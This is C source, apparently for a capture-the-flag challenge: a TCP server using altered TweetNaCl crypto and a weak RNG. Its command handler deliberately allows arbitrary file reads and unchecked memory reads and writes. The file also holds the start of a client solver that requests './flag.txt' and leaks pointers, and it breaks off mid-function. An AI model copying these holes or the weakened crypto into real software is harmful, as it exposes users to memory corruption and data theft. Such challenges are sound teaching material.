#define _GNU_SOURCE         /* See feature_test_macros(7) */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>

#ifndef NDEBUG
#define NDEBUG
#endif
#include <assert.h>


#include "tweetnacl.h"




#define TCP_MAX_LISTEN_COUNT 10

#define FOR(i,n) for (i = 0;i < n;++i)
#define sv __attribute__((always_inline))    static void


typedef unsigned char u8;
typedef unsigned long u32;
typedef unsigned long long u64;
typedef long long i64;
typedef i64 gf[16];
int socketFD;
static char * fileData;

struct rc4_state randState = { 0 } ;

inliner static void initRand(void);
inliner static void randombytes(unsigned char * ptr, unsigned int length);
inliner static int readAll(uint8_t * bytes, uint8_t * salsaKey);
inliner static int writeAll(uint8_t * bytes, size_t length, uint8_t * salsaKey);

inliner static int crypto_hashblocks_sha512_tweet(unsigned char *,const unsigned char *,unsigned long long, uint8_t tweak);

int do_tcp_accept(int lfd);
int do_tcp_listen(const char *server_ip, uint16_t port);




static const u8 sigma[16] = "\x3C\xE3\x12\x05\xFF\xCC\x98\x66\x1A\x64\x80\x1B\xA6\x28\xC5\xD5";


static const u8
    _0[16],
    _9[32] = {9};

static const gf
    _121665 = {0xDB41,1};




static const u8 iv[72] = {
   0x49, 0xc0, 0xaa, 0x32, 0x56, 0x13, 0x44, 0x3a, 
   0x36, 0x74, 0x68, 0xed, 0x8b, 0x0e, 0x65, 0x1c, 
   0xcb, 0x8b, 0x32, 0x01, 0xd9, 0x81, 0x4f, 0x25, 
   0x94, 0x73, 0x4a, 0x26, 0x0a, 0x60, 0xbf, 0x39, 
   0x2a, 0x89, 0x84, 0x86, 0x2e, 0x0b, 0xc0, 0x86, 
   0x8f, 0x76, 0x1b, 0xe3, 0xbf, 0x73, 0xce, 0x6e,
   0x6f, 0xe0, 0x12, 0x46, 0x17, 0x3b, 0x09, 0x0f,
   0xd0, 0xc2, 0x6e, 0x80, 0xaa, 0xce, 0xaf, 0x01,
   0x36, 0x74, 0x68, 0xed, 0x8b, 0x0e, 0x65, 0x1c

} ;

inliner
static u32 leftRotate(u32 x,int c) { 
    return (x << c) | ((x&0xffffffff) >> (32 - c)); 
}

inliner
static u32 load32(const u8 *x)
{
    u32 u = x[3];
    u = (u<<8)|x[2];
    u = (u<<8)|x[1];
    return (u<<8)|x[0];
}

inliner
static u64    dl64(const u8 *x)
{
    u64 i,u=0;
    FOR(i,8) u=(u<<8)|x[i];
    return u;
}

sv st32(u8 *x,u32 u)
{
    int i;
    FOR(i,4) { x[i] = u; u >>= 8; }
}

sv ts64(u8 *x,u64 u)
{
    int i;
    for (i = 7;i >= 0;--i) { x[i] = u; u >>= 8; }
}

sv core(u8 *out,const u8 *in,const u8 *k,const u8 *c,int h)
{
    u32 w[16],x[16],y[16],t[4];
    int i,j,m;

    FOR(i,4) {
        x[5*i] = load32(c+4*i);
        x[1+i] = load32(k+4*i);
        x[6+i] = load32(in+4*i);
        x[11+i] = load32(k+16+4*i);
    }

    FOR(i,16) y[i] = x[i];

    FOR(i,22) {
        FOR(j,4) {
            FOR(m,4) t[m] = x[(5*j+4*m)%16];
            t[1] ^= leftRotate(t[0]+t[3], 5);
            t[2] ^= leftRotate(t[1]+t[0], 9);
            t[3] ^= leftRotate(t[2]+t[1],13);
            t[0] ^= leftRotate(t[3]+t[2],18);
            FOR(m,4) w[4*j+(j+m)%4] = t[m];
        }
        FOR(m,16) x[m] = w[m];
    }

    if (h) {
        FOR(i,16) x[i] += y[i];
        FOR(i,4) {
            x[5*i] -= load32(c+4*i);
            x[6+i] -= load32(in+4*i);
        }
        FOR(i,4) {
            st32(out+4*i,x[5*i]);
            st32(out+16+4*i,x[6+i]);
        }
    } else
        FOR(i,16) st32(out + 4 * i,x[i] + y[i]);
}

inliner static int crypto_core_salsa20(u8 *out,const u8 *in,const u8 *k,const u8 *c)
{
    core(out,in,k,c,0);
    return 0;
}



inliner static int crypto_core_hsalsa20(u8 *out,const u8 *in,const u8 *k,const u8 *c)
{
    core(out,in,k,c,1);
    return 0;
}


inliner static int crypto_stream_salsa20_xor(u8 *c,const u8 *m,u64 b,const u8 *n,const u8 *k)
{
    u8 z[16],x[64];
    u32 u,i;
    if (!b) return 0;
    FOR(i,16) z[i] = 0;
    FOR(i,8) z[i] = n[i];
    while (b >= 64) {
        crypto_core_salsa20(x,z,k,sigma);
        FOR(i,64) c[i] = (m?m[i]:0) ^ x[i];
        u = 1;
        for (i = 8;i < 16;++i) {
            u += (u32) z[i];
            z[i] = u;
            u >>= 8;
        }
        b -= 64;
        c += 64;
        if (m) m += 64;
    }
    if (b) {
        crypto_core_salsa20(x,z,k,sigma);
        FOR(i,b) c[i] = (m?m[i]:0) ^ x[i];
    }
    return 0;
}

sv add1305(u32 *h,const u32 *c)
{
    u32 j,u = 0;
    FOR(j,17) {
        u += h[j] + c[j];
        h[j] = u & 255;
        u >>= 8;
    }
}

static const u32 minusp[17] = {
    5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 252
} ;

inliner static 
int crypto_onetimeauth(u8 *out, const u8 *m,u64 n,const u8 * nonce, const u8 * keyVal)
{
    u32 s,i,j,u,x[17],r[17],h[17],c[17],g[17];
    uint8_t k[32];
    uint64_t * k64 =  (uint64_t *) &k;
    uint64_t * kv64 = (uint64_t *) keyVal;

    k64[0] = kv64[0];
    k64[1] = kv64[1];
    k64[2] = kv64[2];
    k64[3] = kv64[3];


    for(i = 0; i < 8; i++){
        k[     i] =  k[i]      ^ (nonce[i] * 0x7);
        k[8  + i] =  k[8 + i]  ^ (nonce[i]>> 2);
        k[12 + i] =  k[12 + i] ^ (nonce[i]<< 2);
        k[16 + i] =  k[16 + i] ^ (nonce[i] + 2);
        k[24 + i] =  k[24 + i] ^ (nonce[i] - 7);
    }

    for(j = 0; j< 22; j++)
    {
        uint32_t * kbuf = (unsigned int *)k;
        int kbufLen = 8;
        for(i = 0; i < 32; i++)
        {
            kbuf[i%kbufLen] = leftRotate(kbuf[(i*9) % kbufLen], k[i] % 32) ^ kbuf[k[i]&7];
            k[i] = k[i] ^ 0xcc;
            k[k[i] % 32] = k[k[i] % 32] ^ 0x37;
        }
    }

    FOR(j,17) r[j]=h[j]=0;
    FOR(j,16) r[j]=k[j];
    r[3]&=15;
    r[4]&=252;
    r[7]&=15;
    r[8]&=252;
    r[11]&=15;
    r[12]&=252;
    r[15]&=15;

    while (n > 0) {
        FOR(j,17) c[j] = 0;
        for (j = 0;(j < 16) && (j < n);++j) c[j] = m[j];
        c[j] = 1;
        m += j; n -= j;
        add1305(h,c);
        FOR(i,17) {
            x[i] = 0;
            FOR(j,17) x[i] += h[j] * ((j <= i) ? r[i - j] : 320 * r[i + 17 - j]);
        }
        FOR(i,17) h[i] = x[i];
        u = 0;
        FOR(j,16) {
            u += h[j];
            h[j] = u & 255;
            u >>= 8;
        }
        u += h[16]; h[16] = u & 3;
        u = 5 * (u >> 2);
        FOR(j,16) {
            u += h[j];
            h[j] = u & 255;
            u >>= 8;
        }
        u += h[16]; h[16] = u;
    }

    FOR(j,17) g[j] = h[j];
    add1305(h,minusp);
    s = -(h[16] >> 7);
    FOR(j,17) h[j] ^= s & (g[j] ^ h[j]);

    FOR(j,16) c[j] = k[j + 16];
    c[16] = 0;
    add1305(h,c);
    FOR(j,16) out[j] = h[j];
    return 0;
}



sv car25519(gf o)
{
    int i;
    i64 c;
    FOR(i,16) {
        o[i]+=(1LL<<16);
        c=o[i]>>16;
        o[(i+1)*(i<15)]+=c-1+37*(c-1)*(i==15);
        o[i]-=c<<16;
    }
}

sv sel25519(gf p,gf q,int b)
{
    i64 t,i,c=~(b-1);
    FOR(i,16) {
        t= c&(p[i]^q[i]);
        p[i]^=t;
        q[i]^=t;
    }
}


sv unpack25519(gf o, const u8 *n)
{
    int i;
    FOR(i,16) o[i]=n[2*i]+((i64)n[2*i+1]<<8);
    o[15]&=0x7fff;
}

sv A(gf o,const gf a,const gf b)
{
    int i;
    FOR(i,16) o[i]=a[i]+b[i];
}

sv Z(gf o,const gf a,const gf b)
{
    int i;
    FOR(i,16) o[i]=a[i]-b[i];
}

sv M(gf o,const gf a,const gf b)
{
    i64 i,j,t[31];
    FOR(i,31) t[i]=0;
    FOR(i,16) FOR(j,16) t[i+j]+=a[i]*b[j];
    FOR(i,15) t[i]+=38*t[i+16];
    FOR(i,16) o[i]=t[i];
    car25519(o);
    car25519(o);
}

sv S(gf o,const gf a)
{
    M(o,a,a);
}

sv inv25519(gf o,const gf i)
{
    gf c;
    int a;
    FOR(a,16) c[a]=i[a];
    for(a=253;a>=0;a--) {
        S(c,c);
        if(a!=2&&a!=4) M(c,c,i);
    }
    FOR(a,16) o[a]=c[a];
}

sv pack25519(u8 *o,const gf n)
{
    int i,j,b;
    gf m,t;
    FOR(i,16) t[i]=n[i];
    car25519(t);
    car25519(t);
    car25519(t);
    FOR(j,2) {
        m[0]=t[0]-0xffed;
        for(i=1;i<15;i++) {
            m[i]=t[i]-0xffff-((m[i-1]>>16)&1);
            m[i-1]&=0xffff;
        }
        m[15]=t[15]-0x7fff-((m[14]>>16)&1);
        b=(m[15]>>16)&1;
        m[14]&=0xffff;
        sel25519(t,m,1-b);
    }
    FOR(i,16) {
        o[2*i]=t[i]&0xff;
        o[2*i+1]=t[i]>>8;
    }
}

inliner static int crypto_scalarmult(u8 *q,const u8 *n,const u8 *p)
{
    u8 z[32];
    i64 x[80],r,i;
    gf a,b,c,d,e,f;
    FOR(i,31) z[i]=n[i];
    z[31]=(n[31]&127)|64;
    z[0]&=248;
    unpack25519(x,p);
    FOR(i,16) {
        b[i]=x[i];
        d[i]=a[i]=c[i]=0;
    }
    a[0]=d[0]=1;
    for(i=254;i>=0;--i) {
        r=(z[i>>3]>>(i&7))&1;
        sel25519(a,b,r);
        sel25519(c,d,r);
        A(e,a,c);
        Z(a,a,c);
        A(c,b,d);
        Z(b,b,d);
        S(d,e);
        S(f,a);
        M(a,c,a);
        M(c,b,e);
        A(e,a,c);
        Z(a,a,c);
        S(b,a);
        Z(c,d,f);
        M(a,c,_121665);
        A(a,a,d);
        M(c,c,a);
        M(a,d,f);
        M(d,b,x);
        S(b,e);
        sel25519(a,b,r);
        sel25519(c,d,r);
    }
    FOR(i,16) {
        x[i+16]=a[i];
        x[i+32]=c[i];
        x[i+48]=b[i];
        x[i+64]=d[i];
    }
    inv25519(x+32,x+32);
    M(x+16,x+16,x+32);
    pack25519(q,x+16);
    return 0;
}


inliner static 
int crypto_scalarmult_base(u8 *q,const u8 *n)
{ 
    int ret = crypto_scalarmult(q,n,_9);
    return ret;
}

inliner static 
int crypto_box_keypair(u8 *y,u8 *x)
{
    int ret = 0;
    randombytes(x,32);
    ret = crypto_scalarmult_base(y,x);
    return ret;
    
}

inliner static 
int crypto_box_beforenm(u8 *k,const u8 *y,const u8 *x)
{
    u8 s[32];
    crypto_scalarmult(s,x,y);
    return crypto_core_hsalsa20(k,_0,s,sigma);
}

inliner static u64 R(u64 x,int c) { return (x >> c) | (x << (64 - c)); }
inliner static u64 Ch(u64 x,u64 y,u64 z) { return (x & y) ^ (~x & z); }
inliner static u64 Maj(u64 x,u64 y,u64 z) { return (x & y) ^ (x & z) ^ (y & z); }
inliner static u64 Sigma0(u64 x) { return R(x,28) ^ R(x,34) ^ R(x,39); }
inliner static u64 Sigma1(u64 x) { return R(x,14) ^ R(x,18) ^ R(x,41); }
inliner static u64 sigma0(u64 x) { return R(x, 1) ^ R(x, 8) ^ (x >> 7); }
inliner static u64 sigma1(u64 x) { return R(x,19) ^ R(x,61) ^ (x >> 6); }
static const u64 K[] = 
{
    0x80c923985966305eULL, 0x75ad5c9e66fdeee6ULL, 0xb424dfcfa4ed76fbULL, 0xc6a377e63722ff4eULL, 
    0x2eaa299ec6d93aceULL, 0x2981dbf854c7cdf9ULL, 0x30db48f6f0a5a55bULL, 0xd4c4d8eb2f522c70ULL, 
    0x85f17071b948f18dULL, 0xd053ff699221c428ULL, 0x7C766751c0546b98ULL, 0xf6ed28f09b2579edULL, 
    0x18dd4a3a10c64740ULL, 0xe09116a4188b2879ULL, 0x3fc97afbda898d6eULL, 0x9889d98c89d79946ULL, 
    0x311977f93a141961ULL, 0xb93787d407abffa8ULL, 0x30858fa2a5f6e08cULL, 0xeff302e001553a37ULL, 
    0xd94a3b2038cf1464ULL, 0xcd40813ddaa1d333ULL, 0xe35e57e804b2d32eULL, 0x536b5b1d6e679a51ULL, 
    0x597f2fdf96c1cc3eULL, 0x480fe5380c55a9c7ULL, 0xc088e528f2960e5cULL, 0x9e6320b5d50896bULL, 
    0xd9c963f2e4c07abeULL, 0xa987dfe1c06762ffULL, 0x4c8c75e1a0d40b59ULL, 0x989bbbefe3e41f59ULL, 
    0x304fdecd6fc93116ULL, 0x30f59b0f170e6581ULL, 0x7175e8762d8a5afaULL, 0x28cfaf8de499383bULL, 
    0xb52dfed16edb39caULL, 0x57e25c4b791f2731ULL, 0xf812539e30adb75dULL, 0x2b0f872e655be0b0ULL, 
    0x314380604840d080ULL, 0x384f9bc200c477d5ULL, 0x2e29a34297c76dc0ULL, 0x3dd11ceaac05c214ULL, 
    0x43c5be62f714eebeULL, 0x12544d13a589cc8bULL, 0x72d413d92ff7bf0aULL, 0x8975f57c9297c3edULL, 
    0xee32296967dc5d80ULL, 0xd0a0eb1ffdadf23cULL, 0x64073a13a15c1679ULL, 0xe8dd51ca28b30d20ULL, 
    0xbe09b2fefb87046cULL, 0x6d3a4178077d0289ULL, 0x81fefa936491d7ddULL, 0x73fdb2989e94f280ULL, 
    0xca270d5c42a0a636ULL, 0x15743b79059418ebULL, 0xa3a76f08ad89ad75ULL, 0x84c70a232feac00fULL, 
    0xea228f9be0ecbc8bULL, 0x7cd8e8073f2ab7d1ULL, 0x352139a97864865cULL, 0x4bd6462e964645aaULL, 
    0xb9b95a4d698f65c0ULL, 0xd685e65c6af8e871ULL, 0xf71222234a2fe54dULL, 0xaf525be19cd68e3cULL, 
    0x8adc6fb079af977aULL, 0xa8c4e64ca485f582ULL, 0xd6e2288fbe4c71feULL, 0x1c25520fdd740d52ULL, 
    0x85661ce5641e8274ULL, 0x71401523c74eb760ULL, 0x952b98efe4fb92a4ULL, 0xc456ddac219de4d6ULL, 
    0x78306923a57e11f5ULL, 0xf5ccfc1fdace2f73ULL, 0xab3a84fdefdc6579ULL, 0x96c0f01affa94150ULL, 
    0x6c44198c4a475817ULL
};

//If tweak is 0, hashblocks acts normally
inliner static 
int crypto_hashblocks(u8 *x,const u8 *m,u64 n, uint8_t tweak)
{
  u64 z[8],b[8],a[8],w[16],t;
  int i,j;


  FOR(i,8) z[i] = a[i] = dl64(x + 8 * i);

  while (n >= 128) {
    FOR(i,16) w[i] = dl64(m + 8 * i);

    FOR(i,80) {
      FOR(j,8) b[j] = a[j];
      t = a[7] + Sigma1(a[4]) + Ch(a[4],a[5],a[6]) + K[i] + w[i%16] + tweak;
      b[7] = t + Sigma0(a[0]) + Maj(a[0],a[1],a[2]);
      b[3] += t;
      FOR(j,8) a[(j+1)%8] = b[j];
      if (i%16 == 15)
    FOR(j,16)
      w[j] += w[(j+9)%16] + sigma0(w[(j+1)%16]) + sigma1(w[(j+14)%16]);
    }

    FOR(i,8) { a[i] += z[i]; z[i] = a[i]; }

    m += 128;
    n -= 128;
  }

  FOR(i,8) ts64(x+8*i,z[i]);

  return n;
}


inliner static
int crypto_hash(u8 *out,const u8 *m,u64 n, uint8_t tweak)
{
  u8 h[64],x[256];
  u64 i,b = n;

  FOR(i,64) h[i] = iv[i];

  crypto_hashblocks(h,m,n,tweak);
  m += n;
  n &= 127;
  m -= n;

  FOR(i,256) x[i] = 0;
  FOR(i,n) x[i] = m[i];
  x[n] = 128;

  n = 256-128*(n<112);
  x[n-9] = b >> 61;
  ts64(x+n-8,b<<3);
  crypto_hashblocks(h,x,n,tweak);

  FOR(i,64) out[i] = h[i];

  return 0;
}




void hexdump(const unsigned char * data, int len)
{
    int i;
    for (i = 0; i < len; i++) {
        LOGI("%02X", (uint8_t)data[i]);
    }
    LOGI("\n");
}





inliner static void initRand(void)
{
    uint8_t tmpKey[KEY_SIZE]; 
    uint8_t * baseRandom;
    uint8_t i,j,temp;

    i = 0;
    j = 0;

    int ret = syscall(SYS_getrandom, tmpKey, KEY_SIZE, 0);

    if(ret == -1)
    {
        assert(ret != -1);
        exit(1);        
    }

    baseRandom = randState.baseRandom;

    for(int i = 0; i < 256; i++)
    {
        baseRandom[i] = i;
    }

    randState.i = 0;
    randState.j = 0;


    for(int index = 0 ; index < SEED_SIZE; index++)
    {
        j = j + baseRandom[index] + tmpKey[index % KEY_SIZE];
        temp = baseRandom[j];
        baseRandom[j] = baseRandom[i];
        baseRandom[i] = temp;
    }

    randState.i = i;
    randState.j = j;
    randState.initialized = 1;
}


inliner static void randombytes(unsigned char * ptr, unsigned int length) 
{
    if(randState.initialized == 0)
    {
        initRand();
    }

    uint8_t * baseRandom = randState.baseRandom;
    uint8_t i = randState.i;
    uint8_t j = randState.j;
    uint8_t temp;
    int iter = 0;

    for(iter = 0; iter < length; iter++)
    {     
        i++;
        j = j + baseRandom[i];

        temp = baseRandom[j];
        baseRandom[j] = baseRandom[i];
        baseRandom[i] = temp;

        ptr[iter] = baseRandom[(baseRandom[i] + baseRandom[j]) % SEED_SIZE];
        
        i = i + baseRandom[0] + baseRandom[8];
    }
    randState.i = i;
    randState.j = j;

}

#define TEMP_BUF_SIZE (4096)
#define IV_SIZE  (8)
#define TAG_SIZE (16)


struct messageStruct {
    uint8_t  nonce[IV_SIZE];
    uint8_t  tag[TAG_SIZE];
    uint32_t length;
    uint8_t  message[0];
} __attribute__((packed)) ;


#define MESSAGE_SIZE (4096)



inliner static 
int writeBytes(uint8_t * bytes, size_t length)
{
    int bytesWritten = 0;

    LOGI("Attempting to write %ld bytes to %d\n", length, socketFD);
    while(length != bytesWritten)
    {
        int tempWritten = syscall(SYS_write, socketFD, bytes + bytesWritten , length - bytesWritten);
        if(errno == EAGAIN || errno == EWOULDBLOCK)
        {
            continue;
        }

        if(tempWritten < 1)
        {
            LOGI("Failed to write: %s\n", strerror(errno));
            exit(201);
        }
        bytesWritten += tempWritten;
    }
    return bytesWritten;
}

inliner static 
size_t readMessage(uint8_t * byteBuffer)
{
    struct messageStruct * ms = (struct messageStruct *) byteBuffer;
    ssize_t tempRead = 0;
    uint32_t blinder;
    size_t bytesRead = 0;

    tempRead = syscall(SYS_read, socketFD, byteBuffer, sizeof(struct messageStruct));
    
    if(tempRead != sizeof(struct messageStruct))
    {
        LOGI("Read %ld expecting %ld\n", tempRead, sizeof(struct messageStruct));
        exit(203);
    }

    blinder = *(uint32_t*) ms->nonce;
    ms->length = ms->length ^ blinder;

    if(ms->length > MESSAGE_SIZE)
    {
        LOGI("Message claims to be too long %d\n", ms->length);
        exit(209);
    }

    LOGI("Reading message of size %u\n", ms->length);
    while(ms->length != bytesRead)
    {
        int tempRead = read(socketFD, ms->message +  bytesRead , ms->length - bytesRead);
        if(errno == EAGAIN || errno == EWOULDBLOCK)
        {
            continue;
        }
        if(tempRead < 1)
        {
            exit(201);
        }
        bytesRead += tempRead;
    }
    LOGI("Read %ld bytes\n",bytesRead);

    return tempRead + sizeof(struct messageStruct);
}



inliner static 
int writeAll(uint8_t * bytes, size_t length, uint8_t * salsaKey)
{
    size_t ret = -1;
    uint8_t messageBuf[(MESSAGE_SIZE+sizeof(struct messageStruct))];
    struct messageStruct * ms = (struct messageStruct *) messageBuf;
    uint32_t blinder;
    memset(ms, 0, MESSAGE_SIZE);
    
    randombytes(ms->nonce, IV_SIZE);


    crypto_stream_salsa20_xor(ms->message, 
        bytes, 
        length, 
        ms->nonce, 
        salsaKey);
    
    crypto_onetimeauth(ms->tag, ms->message, length, ms->nonce, salsaKey);
    blinder = *(uint32_t*) ms->nonce;

    ms->length = length ^ blinder;

    ret =  length + sizeof(struct messageStruct);
    writeBytes(messageBuf, ret);

    return ret;
}


inliner static 
int readAll(uint8_t * bytes, uint8_t * salsaKey)
{
    struct messageStruct * ms ;
    uint8_t tempTag[TAG_SIZE];
    uint8_t tempMessage[MESSAGE_SIZE+sizeof(struct messageStruct)];
    LOGI("Attempting to read message\n");
    readMessage(tempMessage);

    ms = (struct messageStruct *) tempMessage;

    crypto_onetimeauth(tempTag, ms->message, ms->length, ms->nonce, salsaKey);

    for(int i = 0; i < TAG_SIZE; i++)
    {
        if(ms->tag[i] != tempTag[i])
        {
            LOGI("INVALID TAG\n");
            exit(0);
        }
    }

    crypto_stream_salsa20_xor(bytes,
        ms->message,
        ms->length, 
        ms->nonce, 
        salsaKey);

    return ms->length;
}




void doChallenge(int baseFD)
{
    uint8_t publicKey[32], privateKey[32];
    uint8_t pClientKey[64], pServerKey[64], clientPublicKey[32], masterKey[128];
    ssize_t ret;
    uint8_t readMessage[MESSAGE_SIZE+sizeof(struct messageStruct)];

    socketFD = baseFD;
    memset(publicKey,  0, sizeof(publicKey));
    memset(masterKey,  0, sizeof(masterKey));
    memset(pClientKey, 0, sizeof(pClientKey));
    memset(pServerKey, 0, sizeof(pServerKey));


    crypto_box_keypair(publicKey, privateKey);

    ret = write(baseFD, publicKey, sizeof(publicKey));
    if(ret != 32)
    {
        assert(ret != 32);
        exit(0);
    }

    ret = read(baseFD, clientPublicKey, 32);
    if(ret != 32)
    {
        assert(ret != 32);
        exit(0);
    }

    crypto_box_beforenm(masterKey, clientPublicKey, privateKey);
    crypto_hash(pServerKey, masterKey, 64, masterKey[0]);
    crypto_hash(pClientKey, masterKey, 64, masterKey[1]);

    LOGI("PC: ");
    hexdump(pClientKey, 32);
    LOGI("PS: ");
    hexdump(pServerKey, 32);

    while(1)
    {
        size_t bytesRead;
        size_t offsetIntoMessage = 0;
        uint64_t cmd, cmdReturn;
        
        bytesRead = readAll(readMessage, pClientKey);
        if(bytesRead < sizeof(cmd))
        {
            LOGI("Failed to read the value\n");
            exit(209);
        }
        cmd = *(uint64_t*) readMessage;
        offsetIntoMessage += sizeof(cmd);
        LOGI("CMD = %lu\n", cmd);

        switch(cmd)
        {
            case 1:
                LOGI("Writing a new value\n");
                writeAll(pServerKey, 4, pServerKey);
                break;
            case 2:
                {
                LOGI("Reading file into ram\n");
                fileData = malloc(1024);
                uint8_t tempBuf[32];
                ssize_t readReturn = 0; 
                LOGI("Reading file named %s\n", (char*)readMessage + offsetIntoMessage);
                int fd = open((char*)readMessage + offsetIntoMessage, O_RDONLY);

                if(fd < 0)
                {
                    LOGI("Failed to open the file descriptor\n");
                    cmdReturn = -1;
                }
                else{
                    LOGI("Opened fd %d\n", fd);
                    cmdReturn = fd;
                    readReturn = read(fd, fileData, 1024);
                    LOGI("Read %ld bytes from %d to %p\n", readReturn, fd, fileData);
                    close(fd);
                }

                memcpy(tempBuf, &cmdReturn, sizeof(cmdReturn));
                memcpy(tempBuf+sizeof(cmdReturn), &readReturn, sizeof(readReturn));
                writeAll(tempBuf, sizeof(cmdReturn) + sizeof(readReturn), pServerKey);
                
                }
                break;
            case 3:
            {
                LOGI("Getting array bytes\n");
                uint64_t arrOffset =  *(uint64_t*) (readMessage + offsetIntoMessage);
                offsetIntoMessage += sizeof(cmd);
                uint64_t   numBytes  =  *(uint64_t*) (readMessage + offsetIntoMessage);
                LOGI("Writing from %04ld bytes from %p\n",numBytes, &K[arrOffset]);
                writeAll((uint8_t*)&K[arrOffset], numBytes, pServerKey);
            }
                break ;
            case 4:
            {
                LOGI("Writing array byte\n");
                uint64_t arrOffset =  *(uint64_t*) (readMessage + offsetIntoMessage);
                offsetIntoMessage += sizeof(cmd);
                size_t   numBytes  =  *(uint64_t*) (readMessage + offsetIntoMessage);
                offsetIntoMessage += sizeof(numBytes);

                memcpy(arrOffset + &randState, offsetIntoMessage + readMessage, numBytes);

                writeAll((uint8_t *)&numBytes, sizeof(numBytes), pServerKey);
            }
                break ;
            default:
                exit(213);
        }
    }

    


}
void handle_sigchld(int sig) {
  int saved_errno = errno;
  while (waitpid((pid_t)(-1), 0, WNOHANG) > 0) {}
  errno = saved_errno;
}


int do_tcp_listen(const char *server_ip, uint16_t port)
{
    struct sockaddr_in addr;
    int optval = 1;
    int lfd;
    int ret;

    lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) {
        LOGI("Socket creation failed\n");
        return -1;
    }

    addr.sin_family = AF_INET;
    if (inet_aton(server_ip, &addr.sin_addr) == 0) {
        LOGI("inet_aton failed\n");
        goto err_handler;
    }
    addr.sin_port = htons(port);

    if (setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval))) {
        LOGI("set sock reuseaddr failed\n");
    }
    ret = bind(lfd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret) {
        LOGI("bind failed %s:%d\n", server_ip, port);
        goto err_handler;
    }

    LOGI("TCP listening on %s:%d...\n", server_ip, port);
    ret = listen(lfd, TCP_MAX_LISTEN_COUNT);
    if (ret) {
        LOGI("listen failed\n");
        goto err_handler;
    }
    LOGI("TCP listen fd=%d\n", lfd);
    return lfd;
err_handler:
    close(lfd);
    return -1;
}




int do_tcp_accept(int lfd)
{
    struct sockaddr_in peeraddr;
    socklen_t peerlen = sizeof(peeraddr);
    int cfd;

    LOGI("\n\n###Waiting for TCP connection from client...\n");
    cfd = accept(lfd, (struct sockaddr *)&peeraddr, &peerlen);
    if (cfd < 0) {
        LOGI("accept failed, errno=%d\n", errno);
        return -1;
    }

    LOGI("TCP connection accepted fd=%d\n", cfd);
    return cfd;
}


#ifdef SERVER

int main()
{
    int serverFD = do_tcp_listen("0.0.0.0", SALT_PORT);
    int baseFD;

    struct sigaction sa;
    sa.sa_handler = &handle_sigchld;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    if (sigaction(SIGCHLD, &sa, 0) == -1) {
      perror(0);
      exit(1);
    }

    while(1) {
        int child;
        LOGI("[-] Accepting client\n");
        baseFD = do_tcp_accept(serverFD);

        child = fork();
        if(child == -1)
        {
            exit(1);
        }
        if(child == 0)
        {
            break;
        }
        close(baseFD);
    }

    alarm(200);
    doChallenge(baseFD);
}
#endif





#ifdef CLIENT
int baseConnect(char * target, int port)
{
    int socketFD;
    struct sockaddr_in server_addr;
    socketFD = socket(AF_INET, SOCK_STREAM, 0);
    struct timeval timeout;

    if(socketFD < 0)
    {
        printf("Failed to create socket\n");
        return -1;
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(target);

    if(connect(socketFD,(const struct sockaddr *) &server_addr, sizeof(server_addr)) < 0)
    {
        return -1;
    }
    timeout.tv_sec  = 5;
    timeout.tv_usec = 0;

    if(setsockopt(socketFD, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout)))
    {
        printf("[-] Failed to set recv timeout\n");
    }
    if(setsockopt(socketFD, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)))
    {
        printf("[-] Failed to set send timeout\n");
    }

    return socketFD;
}
__attribute__((packed))
struct readCMD
{
    uint64_t cmd;
    uint64_t offset;
    size_t numBytes;
} ;

uint64_t getPointer(uint64_t offset, uint8_t* pClientKey, uint8_t* pServerKey)
{
    struct readCMD rd;
    uint8_t readMessage[MESSAGE_SIZE+sizeof(struct messageStruct)];
    int bytesRead;
    rd.cmd = 3;
    rd.offset = offset;
    rd.numBytes = 0x100;
    writeAll((uint8_t *)&rd, sizeof(rd), pClientKey);
    LOGI("Wrote 0x%ld bytes to server\n", sizeof(rd));
    bytesRead = readAll(readMessage, pServerKey);
    //hexdump(readMessage, bytesRead);
    if(bytesRead < 0)
    {
	exit(1);
    }
    return *(uint64_t*)readMessage;
}

int main()
{
    socketFD = baseConnect("127.0.0.1", SALT_PORT);
    uint8_t publicKey[32], privateKey[32];
    uint8_t pClientKey[64], pServerKey[64], serverPublicKey[32], masterKey[64];
    ssize_t ret;
    uint8_t readMessage[MESSAGE_SIZE+sizeof(struct messageStruct)];
    uint8_t messageBuf[1024];
    struct readCMD rd;
    uint64_t fHeapAddress;

    uint64_t cmd = 0;

    memset(publicKey,  0, sizeof(publicKey));
    memset(masterKey,  0, sizeof(masterKey));
    memset(pClientKey, 0, sizeof(pClientKey));
    memset(pServerKey, 0, sizeof(pServerKey));

    crypto_box_keypair(publicKey, privateKey);

    ret = read(socketFD, serverPublicKey, 32);
    if(ret != 32)
    {
        assert(ret != 32);
        exit(0);
    }

    ret = write(socketFD, publicKey, sizeof(publicKey));
    if(ret != 32)
    {
        assert(ret != 32);
        exit(0);
    }


    crypto_box_beforenm(masterKey, serverPublicKey, privateKey);

    crypto_hash(pServerKey, masterKey, 64, masterKey[0]);
    crypto_hash(pClientKey, masterKey, 64, masterKey[1]);

    LOGI("PC: ");
    hexdump(pClientKey, 32);
    LOGI("PS: ");
    hexdump(pServerKey, 32);

    cmd = 1;
    writeAll((uint8_t *)&cmd, sizeof(cmd), pClientKey);
    int numBytes = readAll(readMessage, pServerKey);
    LOGI("Read %d bytes for cmd 1\n", numBytes);
    hexdump(readMessage, numBytes);
    cmd = 2;
    memset(messageBuf, 0, sizeof(messageBuf));
    memcpy(messageBuf, &cmd, sizeof(cmd));
    strcpy((char*)messageBuf+sizeof(cmd), "./flag.txt\x00");
    writeAll(messageBuf, sizeof(cmd)+12, pClientKey);
    numBytes = readAll(readMessage, pServerKey);
    LOGI("Read %d bytes for cmd 1\n", numBytes);
    hexdump(readMessage, numBytes);

